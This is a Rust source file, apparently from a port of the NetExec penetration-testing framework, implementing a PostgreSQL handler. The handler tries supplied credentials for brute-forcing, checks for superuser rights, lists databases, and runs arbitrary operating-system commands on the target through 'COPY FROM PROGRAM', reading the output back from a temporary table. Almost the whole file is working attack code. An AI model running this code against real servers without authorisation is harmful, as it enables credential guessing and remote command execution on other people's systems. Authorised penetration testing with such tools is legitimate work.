//! # PostgreSQL Protocol Handler
//!
//! PostgreSQL protocol implementation for NetExec-RS.
//! Supports user brute-forcing, database enumeration, and admin checks.

use crate::{CommandOutput, NxcProtocol, NxcSession};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use nxc_auth::{AuthResult, Credentials};
use std::time::Duration;
use tokio_postgres::NoTls;
use tracing::{debug, info};

// ─── PostgreSQL Session ───────────────────────────────────────────

pub struct PostgresSession {
    pub target: String,
    pub port: u16,
    pub admin: bool,
    pub credentials: Option<Credentials>,
}

impl NxcSession for PostgresSession {
    fn protocol(&self) -> &'static str {
        "postgresql"
    }

    fn target(&self) -> &str {
        &self.target
    }

    fn is_admin(&self) -> bool {
        self.admin
    }
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }
    fn as_any_mut(&mut self) -> &mut dyn std::any::Any {
        self
    }
}

// ─── PostgreSQL Protocol Handler ──────────────────────────────────

pub struct PostgresProtocol {
    pub timeout: Duration,
}

impl PostgresProtocol {
    pub fn new() -> Self {
        Self { timeout: Duration::from_secs(5) }
    }
}

impl Default for PostgresProtocol {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcProtocol for PostgresProtocol {
    fn name(&self) -> &'static str {
        "postgresql"
    }

    fn default_port(&self) -> u16 {
        5432
    }

    fn supports_exec(&self) -> bool {
        true // Possible via COPY FROM PROGRAM or extensions, but we'll focus on SQL for now
    }

    fn supported_modules(&self) -> &[&str] {
        &["pg_enum", "pg_databases"]
    }

    async fn connect(
        &self,
        target: &str,
        port: u16,
        _proxy: Option<&str>,
    ) -> Result<Box<dyn NxcSession>> {
        let addr = format!("{target}:{port}");
        debug!("Postgres: Connecting to {}", addr);

        // Basic TCP check or initial handshake attempt
        let connect_fut = tokio::net::TcpStream::connect(&addr);
        match tokio::time::timeout(self.timeout, connect_fut).await {
            Ok(Ok(_)) => {
                info!("Postgres: Connected to {}", addr);
                Ok(Box::new(PostgresSession {
                    target: target.to_string(),
                    port,
                    admin: false,
                    credentials: None,
                }))
            }
            Ok(Err(e)) => Err(anyhow!("Connection failed: {e}")),
            Err(_) => Err(anyhow!("Connection timeout to {addr}")),
        }
    }

    async fn authenticate(
        &self,
        session: &mut dyn NxcSession,
        creds: &Credentials,
    ) -> Result<AuthResult> {
        let pg_sess = match session.protocol() {
            "postgresql" => unsafe {
                &mut *(session as *mut dyn NxcSession as *mut PostgresSession)
            },
            _ => return Err(anyhow!("Invalid session type")),
        };

        let username = &creds.username;
        let password = creds.password.as_deref().unwrap_or_default();
        let target = &pg_sess.target;
        let port = pg_sess.port;

        let config = format!(
            "host={target} port={port} user={username} password={password} dbname=postgres"
        );
        debug!("Postgres: Authenticating {}@{}", username, target);

        let auth_fut = tokio_postgres::connect(&config, NoTls);
        match tokio::time::timeout(self.timeout, auth_fut).await {
            Ok(Ok((client, connection))) => {
                // The connection object performs the actual communication with the server,
                // so spawn it off to run on its own.
                tokio::spawn(async move {
                    if let Err(e) = connection.await {
                        debug!("Postgres: Connection error: {}", e);
                    }
                });

                debug!("Postgres: Auth successful for {}", username);
                pg_sess.credentials = Some(creds.clone());

                // Check for admin role
                let mut is_admin = false;
                if let Ok(rows) = client
                    .query("SELECT rolsuper FROM pg_roles WHERE rolname = current_user", &[])
                    .await
                {
                    if let Some(row) = rows.first() {
                        is_admin = row.get::<_, bool>(0);
                        if is_admin {
                            debug!("Postgres: User {} is superuser!", username);
                        }
                    }
                }

                pg_sess.admin = is_admin;
                Ok(AuthResult::success(is_admin))
            }
            Ok(Err(e)) => {
                debug!("Postgres: Auth failed for {}: {}", username, e);
                Ok(AuthResult::failure(&e.to_string(), None))
            }
            Err(_) => Ok(AuthResult::failure("Auth timeout", None)),
        }
    }

    async fn execute(&self, session: &dyn NxcSession, cmd: &str) -> Result<CommandOutput> {
        let pg_sess = match session.protocol() {
            "postgresql" => unsafe {
                &*(session as *const dyn NxcSession as *const PostgresSession)
            },
            _ => return Err(anyhow!("Invalid session type")),
        };

        if !pg_sess.admin {
            return Err(anyhow!(
                "Superuser privileges required for command execution via Postgres"
            ));
        }

        let creds = pg_sess.credentials.as_ref().ok_or_else(|| anyhow!("Not authenticated"))?;
        let config = format!(
            "host={} port={} user={} password={} dbname=postgres",
            pg_sess.target,
            pg_sess.port,
            creds.username,
            creds.password.as_deref().unwrap_or_default()
        );

        let (client, connection) = tokio_postgres::connect(&config, NoTls).await?;
        tokio::spawn(async move {
            if let Err(e) = connection.await {
                debug!("Postgres: Connection error during exec: {}", e);
            }
        });

        // Attempting RCE via COPY FROM PROGRAM (requires superuser)
        // Creating a temporary table to store output
        let table_name = format!("nxc_exec_{}", &uuid::Uuid::new_v4().simple().to_string()[..8]);

        client.execute(&format!("CREATE TEMP TABLE {table_name} (output text)"), &[]).await?;
        client
            .execute(
                &format!("COPY {} FROM PROGRAM '{}'", table_name, cmd.replace('\'', "''")),
                &[],
            )
            .await?;

        let rows = client.query(&format!("SELECT * FROM {table_name}"), &[]).await?;
        let mut stdout = String::new();
        for row in rows {
            let line: String = row.get(0);
            stdout.push_str(&line);
            stdout.push('\n');
        }

        Ok(CommandOutput { stdout, stderr: String::new(), exit_code: Some(0) })
    }
}

impl PostgresProtocol {
    /// List all databases.
    pub async fn list_databases(&self, session: &PostgresSession) -> Result<Vec<String>> {
        let creds = session.credentials.as_ref().ok_or_else(|| anyhow!("Not authenticated"))?;
        let config = format!(
            "host={} port={} user={} password={} dbname=postgres",
            session.target,
            session.port,
            creds.username,
            creds.password.as_deref().unwrap_or_default()
        );

        let (client, connection) = tokio_postgres::connect(&config, NoTls).await?;
        tokio::spawn(async move {
            let _ = connection.await;
        });

        let rows =
            client.query("SELECT datname FROM pg_database WHERE datallowconn = true", &[]).await?;
        let dbs = rows.into_iter().map(|row| row.get::<_, String>(0)).collect();
        Ok(dbs)
    }
}
